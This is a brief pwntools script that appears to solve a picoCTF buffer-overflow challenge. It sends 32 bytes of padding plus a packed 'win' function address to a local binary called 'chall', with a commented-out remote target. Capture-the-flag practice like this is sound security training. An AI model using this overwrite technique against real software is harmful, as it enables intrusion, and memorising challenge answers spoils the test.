from pwn import *

#p = remote("mimas.picoctf.net", 61664)

p = process("chall")
junk = b"a"*32 
win_adress = p32(0x04011a0)
payload = junk + win_adress

p.recvuntil("choice:")
p.sendline("2")

p.recvuntil("buffer:")
p.sendline(payload)

p.recvuntil("choice:")
p.sendline("4")

print(p.recvall())
